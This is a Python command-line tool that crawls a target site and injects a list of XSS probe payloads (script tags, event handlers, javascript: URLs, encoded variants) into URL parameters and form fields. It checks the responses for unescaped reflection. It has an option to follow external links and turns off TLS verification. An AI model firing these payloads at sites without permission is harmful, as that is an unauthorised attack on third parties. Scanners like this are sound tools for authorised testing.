#!/usr/bin/env python3
"""
XSS Scanner — reflected XSS + simple DOM vulnerability detection.
Pure Python, no external dependencies.
Works on WSL and Windows.
"""

import argparse
import concurrent.futures
import html.parser
import json
import re
import socket
import ssl
import sys
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Optional

# ─── Payloads ─────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    # Script tag injection
    '<script>alert(1)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<canvas onfocus=alert(1) autofocus>',
    # Attribute injection (quoted)
    '" onmouseover=alert(1) x="',
    "' onmouseover=alert(1) x='",
    # URL injection
    'javascript:alert(1)',
    'javascript:alert(1)//',
    # Event handlers (no tag)
    'onerror=alert(1)',
    'onload=alert(1)',
    # Polynomial length burst (attribute boundary breaker)
    '">' + '<script>alert(1)</script>' + '<!--',
    '<script>alert(1)</script><!--',
    # Null byte bypass
    '<script>alert(1)\x00</script>',
    # URL encoded variants
    '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
]

# Characters that often indicate safe encoding
SAFE_ENCODED = ['&lt;', '&gt;', '&quot;', '&amp;', '&#x', '&#', '&LT;', '&GT;']

# ─── Data structures ───────────────────────────────────────────────────────────

@dataclass
class Vulnerability:
    url: str
    param: str
    method: str
    payload: str
    context: str  # "url_param" | "form_field" | "header" | "cookie"
    injection_point: str  # "html_body" | "html_attr" | "js_string" | "url_param" | "css" | "comment"
    severity: str  # "high" | "medium" | "low"
    evidence: str
    raw_reflection: str

    def to_dict(self):
        return {
            "url": self.url,
            "param": self.param,
            "method": self.method,
            "context": self.context,
            "injection_point": self.injection_point,
            "severity": self.severity,
            "payload": self.payload,
            "evidence": self.evidence[:200],
        }

@dataclass
class ScanStats:
    urls_scanned: int = 0
    params_tested: int = 0
    payloads_sent: int = 0
    vulns_found: int = 0
    start_time: float = 0.0
    duration_s: float = 0.0
    errors: int = 0

    def to_dict(self):
        return {
            "urls_scanned": self.urls_scanned,
            "params_tested": self.params_tested,
            "payloads_sent": self.payloads_sent,
            "vulns_found": self.vulns_found,
            "duration_s": round(self.duration_s, 2),
            "errors": self.errors,
        }

# ─── HTTP helpers ─────────────────────────────────────────────────────────────

def build_ssl_context() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def http_get(url: str, timeout: float = 10.0, headers: Optional[dict] = None) -> tuple[str, dict]:
    ssl_ctx = build_ssl_context()
    h = {"User-Agent": "Mozilla/5.0 (XSS-Scanner/1.0)", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, headers=h, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            headers_out = dict(resp.headers)
            return body, headers_out
    except Exception as e:
        raise ConnectionError(f"GET failed for {url}: {e}")

def http_post(url: str, data: dict, timeout: float = 10.0) -> tuple[str, dict]:
    ssl_ctx = build_ssl_context()
    encoded = urllib.parse.urlencode(data).encode()
    h = {
        "User-Agent": "Mozilla/5.0 (XSS-Scanner/1.0)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
    }
    req = urllib.request.Request(url, data=encoded, headers=h, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            headers_out = dict(resp.headers)
            return body, headers_out
    except Exception as e:
        raise ConnectionError(f"POST failed for {url}: {e}")

# ─── HTML Parser (reflected XSS detection) ───────────────────────────────────

class ReflectionParser(html.parser.HTMLParser):
    """Parse HTML looking for unescaped payload reflections."""

    def __init__(self, payload: str):
        super().__init__()
        self.payload = payload
        self.payload_lower = payload.lower()
        self.reflected = False
        self.contexts_found: list[str] = []

    def handle_data(self, data: str):
        if self.payload_lower in data.lower():
            # Could be in text — check if safely encoded
            for safe in SAFE_ENCODED:
                if safe in data.lower():
                    return  # was safely encoded
            self.reflected = True
            if "html_body" not in self.contexts_found:
                self.contexts_found.append("html_body")

    def handle_starttag(self, tag, attrs):
        attr_str = str(attrs).lower()
        if self.payload_lower in attr_str:
            self.reflected = True
            if "html_attr" not in self.contexts_found:
                self.contexts_found.append("html_attr")
        # Check for event handlers that could execute JS
        for name, val in attrs:
            if name.lower() in ("onerror", "onload", "onmouseover", "onfocus",
                                "onblur", "onclick", "onchange", "oninput",
                                "onsubmit", "onkeydown", "onkeyup", "onkeypress",
                                "onloadstart"):
                if self.payload_lower in str(val).lower():
                    self.reflected = True
                    if "event_handler" not in self.contexts_found:
                        self.contexts_found.append("event_handler")

    def handle_comment(self, data: str):
        if self.payload_lower in data.lower():
            self.reflected = True
            if "comment" not in self.contexts_found:
                self.contexts_found.append("comment")

def is_html_response(body: str, headers: dict) -> bool:
    """Determine if response is likely HTML (not JSON/XML/etc.)"""
    content_type = headers.get("Content-Type", "").lower()
    for ct in ["json", "application/json", "text/json", "xml", "application/xml",
               "text/plain", "image/", "application/octet-stream"]:
        if ct in content_type:
            return False
    body_stripped = body.strip()
    if body_stripped.startswith(('{', '[')):
        return False
    if re.search(r'<!DOCTYPE|html|head|body|title|div|span|a |script|style',
                 body_stripped, re.IGNORECASE):
        return True
    return False

def detect_context(response_body: str, payload: str) -> list[str]:
    """Return list of contexts where payload is reflected unsafely."""
    contexts: list[str] = []
    payload_lower = payload.lower()

    # 1. Plain text reflection
    if payload_lower in response_body.lower():
        encoded_variants = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;'),
            payload.replace('<', '&#60;').replace('>', '&#62;'),
        ]
        is_encoded = any(ev.lower() in response_body.lower() for ev in encoded_variants)
        if not is_encoded:
            contexts.append("html_body")

    # 2. Inside HTML tag attribute (src, href, value, data-*)
    attr_patterns = [
        r'(src|href|data-value|value)=["\']([^"\']*?)' + re.escape(payload) + r'([^"\']*?)["\']',
        r'(on\w+)=["\']([^"\']*?)' + re.escape(payload) + r'([^"\']*?)["\']',
        r'(data-\w+)=["\']([^"\']*?)' + re.escape(payload) + r'([^"\']*?)["\']',
    ]
    for pat in attr_patterns:
        if re.search(pat, response_body, re.IGNORECASE):
            contexts.append("html_attr")

    # 3. Inside <script> block
    script_match = re.search(r'<script[^>]*>(.*?)</script>', response_body, re.DOTALL | re.IGNORECASE)
    if script_match and payload_lower in script_match.group(1).lower():
        contexts.append("js_string")

    # 4. Inside comment
    if re.search(r'<!--.*?' + re.escape(payload) + r'.*?-->', response_body, re.DOTALL | re.IGNORECASE):
        contexts.append("comment")

    # 5. Inside style tag
    style_match = re.search(r'<style[^>]*>(.*?)</style>', response_body, re.DOTALL | re.IGNORECASE)
    if style_match and payload_lower in style_match.group(1).lower():
        contexts.append("css")

    # 6. Inside URL param value
    if re.search(r'\?[^"\']*?' + re.escape(urllib.parse.quote(payload)) + r'[^"\']*',
                 response_body, re.IGNORECASE):
        contexts.append("url_param")

    return contexts

def check_reflection(response_body: str, payload: str) -> bool:
    """Return True if payload appears in response unsafely."""
    contexts = detect_context(response_body, payload)
    return len(contexts) > 0

# ─── URL/Form extractor ────────────────────────────────────────────────────────

class URLFormExtractor(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms: list[dict] = []
        self.links: list[str] = []
        self._current_form: dict = {}
        self._in_form = False

    def handle_starttag(self, tag, attrs):
        attrs_dict = {k: v for k, v in attrs}
        if tag == "form":
            self._current_form = {
                "action": attrs_dict.get("action", ""),
                "method": attrs_dict.get("method", "get").upper(),
                "fields": [],
            }
            self._in_form = True
        elif tag == "input" and self._in_form:
            field_name = attrs_dict.get("name") or attrs_dict.get("id", "")
            field_type = attrs_dict.get("type", "text")
            if field_name:
                self._current_form["fields"].append({
                    "name": field_name,
                    "type": field_type,
                    "default": attrs_dict.get("value", ""),
                })
        elif tag == "textarea" and self._in_form:
            field_name = attrs_dict.get("name") or attrs_dict.get("id", "")
            if field_name:
                self._current_form["fields"].append({
                    "name": field_name,
                    "type": "textarea",
                    "default": "",
                })
        elif tag == "select" and self._in_form:
            field_name = attrs_dict.get("name") or attrs_dict.get("id", "")
            if field_name:
                self._current_form["fields"].append({
                    "name": field_name,
                    "type": "select",
                    "default": "",
                })
        if tag == "a" and "href" in attrs_dict:
            self.links.append(attrs_dict["href"])

    def handle_endtag(self, tag):
        if tag == "form" and self._in_form:
            self.forms.append(self._current_form)
            self._in_form = False

def extract_forms(body: str, base_url: str) -> list[dict]:
    parser = URLFormExtractor()
    try:
        parser.feed(body)
    except Exception:
        pass
    # Resolve relative URLs
    for form in parser.forms:
        action = form["action"]
        if action and not action.startswith(("http://", "https://", "//")):
            form["action"] = urllib.parse.urljoin(base_url, action)
        elif not action:
            form["action"] = base_url
    return parser.forms

def extract_links(body: str, base_url: str) -> list[str]:
    parser = URLFormExtractor()
    try:
        parser.feed(body)
    except Exception:
        pass
    links = []
    for link in parser.links:
        if link.startswith("/"):
            parsed = urllib.parse.urlparse(base_url)
            link = f"{parsed.scheme}://{parsed.netloc}{link}"
        elif not link.startswith(("http://", "https://", "//", "javascript:", "mailto:")):
            link = urllib.parse.urljoin(base_url, link)
        if link.startswith(("http://", "https://")):
            links.append(link)
    return list(set(links))[:50]  # dedupe, limit

def extract_params(url: str) -> list[tuple[str, str]]:
    """Extract existing URL query parameters."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    return params

# ─── Core scanner ───────────────────────────────────────────────────────────────

def test_param_xss(base_url: str, param_name: str, param_value: str,
                   method: str = "GET", body_params: Optional[dict] = None,
                   stats: Optional[ScanStats] = None,
                   workers: int = 20) -> list[Vulnerability]:
    vulns = []
    for payload in XSS_PAYLOADS:
        if stats:
            stats.payloads_sent += 1
        try:
            if method == "GET":
                new_params = [(param_name, payload)]
                existing = [(k, v) for k, v in extract_params(base_url) if k != param_name]
                new_query = urllib.parse.urlencode(existing + new_params)
                parsed = urllib.parse.urlparse(base_url)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                body, resp_headers = http_get(test_url)
            else:
                post_data = dict(body_params or {})
                post_data[param_name] = payload
                body, resp_headers = http_post(base_url, post_data)

            if not is_html_response(body, resp_headers):
                continue
            if not check_reflection(body, payload):
                continue

            contexts = detect_context(body, payload)
            primary_context = contexts[0] if contexts else "unknown"
            severity = "medium"
            if primary_context in ("js_string", "event_handler"):
                severity = "high"
            elif primary_context == "html_attr":
                severity = "medium"

            evidence = ""
            idx = body.lower().find(payload.lower())
            if idx >= 0:
                evidence = body[max(0, idx-40):idx+len(payload)+40]

            vulns.append(Vulnerability(
                url=base_url,
                param=param_name,
                method=method,
                payload=payload,
                context="url_param" if method == "GET" else "form_field",
                injection_point=primary_context,
                severity=severity,
                evidence=evidence,
                raw_reflection=payload,
            ))
        except Exception:
            if stats:
                stats.errors += 1
    return vulns

def scan_url(url: str, stats: ScanStats,
             follow_external: bool = False,
             depth: int = 2) -> tuple[list[Vulnerability], list[str]]:
    vulns: list[Vulnerability] = []
    next_urls: list[str] = []
    stats.urls_scanned += 1

    try:
        body, resp_headers = http_get(url)
    except Exception as e:
        return [], []

    # Test URL parameters
    params = extract_params(url)
    for param_name, param_val in params:
        stats.params_tested += 1
        found = test_param_xss(url, param_name, param_val, method="GET", stats=stats)
        vulns.extend(found)

    # Extract and test form fields
    forms = extract_forms(body, url)
    for form in forms:
        form_url = form["action"]
        method = form["method"]
        for field in form["fields"]:
            if field["type"] in ("submit", "button", "reset", "hidden", "image", "file"):
                continue
            stats.params_tested += 1
            body_params = {f["name"]: f["default"] or "test" for f in form["fields"]}
            found = test_param_xss(form_url, field["name"], field["default"] or "test",
                                    method=method, body_params=body_params, stats=stats)
            vulns.extend(found)

    # Extract links for next depth level
    if depth > 0:
        next_urls = extract_links(body, url)

    return vulns, next_urls

def crawl_and_scan(seed_url: str, stats: ScanStats,
                   max_urls: int = 20,
                   follow_external: bool = False,
                   depth: int = 2,
                   workers: int = 15) -> list[Vulnerability]:
    all_vulns: list[Vulnerability] = []
    visited: set[str] = set()
    queue: list[str] = [seed_url]
    depth_queue: list[int] = [depth]

    parsed_seed = urllib.parse.urlparse(seed_url)
    seed_host = parsed_seed.netloc

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        while queue:
            current_url = queue.pop(0)
            current_depth = depth_queue.pop(0)

            if current_url in visited:
                continue
            visited.add(current_url)

            vulns, next_links = scan_url(current_url, stats, follow_external, current_depth)
            all_vulns.extend(vulns)
            stats.vulns_found = len(all_vulns)

            if current_depth > 0:
                for link in next_links:
                    link_parsed = urllib.parse.urlparse(link)
                    if link in visited:
                        continue
                    if not follow_external and link_parsed.netloc != seed_host:
                        continue
                    if len(queue) + len(visited) < max_urls:
                        queue.append(link)
                        depth_queue.append(current_depth - 1)

            if len(visited) >= max_urls:
                break

    return all_vulns

# ─── Formatters ────────────────────────────────────────────────────────────────

def format_discord(vulns: list[Vulnerability], url: str, stats: ScanStats) -> str:
    lines = [
        f"**🚨 XSS Scan Report — `{url}`**",
        f"> URLs: `{stats.urls_scanned}` | Params: `{stats.params_tested}` | Payloads: `{stats.payloads_sent}` | Time: `{stats.duration_s:.1f}s`",
        ""
    ]
    if not vulns:
        lines.append("> _No XSS vulnerabilities detected._ ✅")
        return "\n".join(lines)

    high = [v for v in vulns if v.severity == "high"]
    med = [v for v in vulns if v.severity == "medium"]
    low = [v for v in vulns if v.severity == "low"]

    if high:
        lines.append(f"⚠️ **High Risk — {len(high)} found**")
        for v in high[:5]:
            lines.append(f"  `{v.method}` `{v.param}` → `{v.injection_point}`")
            lines.append(f"  Payload: `{v.payload[:60]}`")
        if len(high) > 5:
            lines.append(f"  _...and `{len(high)-5}` more high-risk findings_")
        lines.append("")

    if med:
        lines.append(f"⚡ **Medium Risk — {len(med)} found**")
        for v in med[:5]:
            lines.append(f"  `{v.method}` `{v.param}` → `{v.injection_point}`")
            lines.append(f"  Payload: `{v.payload[:60]}`")
        if len(med) > 5:
            lines.append(f"  _...and `{len(med)-5}` more medium-risk findings_")
        lines.append("")

    if low:
        lines.append(f"🔍 **Low Risk / Info — {len(low)} found**")
        for v in low[:3]:
            lines.append(f"  `{v.param}` → `{v.injection_point}`")

    return "\n".join(lines).strip()

def format_json(vulns: list[Vulnerability], stats: ScanStats) -> str:
    return json.dumps({
        "stats": stats.to_dict(),
        "vulnerabilities": [v.to_dict() for v in vulns],
    }, indent=2)

def format_simple(vulns: list[Vulnerability]) -> str:
    if not vulns:
        return "No XSS vulnerabilities found."
    lines = []
    for v in vulns:
        lines.append(f"[{v.severity.upper()}] {v.method} {v.url} | param={v.param} | context={v.injection_point} | payload={v.payload}")
    return "\n".join(lines)

# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--depth", type=int, default=2, help="Crawl depth (default: 2)")
    parser.add_argument("--max-urls", type=int, default=20, help="Max URLs to crawl (default: 20)")
    parser.add_argument("--workers", type=int, default=15, help="Concurrent workers (default: 15)")
    parser.add_argument("--format", choices=["discord", "json", "simple"], default="discord")
    parser.add_argument("--follow-external", action="store_true", help="Follow external links during crawl")
    args = parser.parse_args()

    stats = ScanStats(start_time=time.perf_counter())
    vulns = crawl_and_scan(
        args.url, stats,
        max_urls=args.max_urls,
        follow_external=args.follow_external,
        depth=args.depth,
        workers=args.workers,
    )
    stats.duration_s = time.perf_counter() - stats.start_time

    if args.format == "discord":
        print(format_discord(vulns, args.url, stats))
    elif args.format == "json":
        print(format_json(vulns, stats))
    else:
        print(format_simple(vulns))

if __name__ == "__main__":
    raise SystemExit(main())
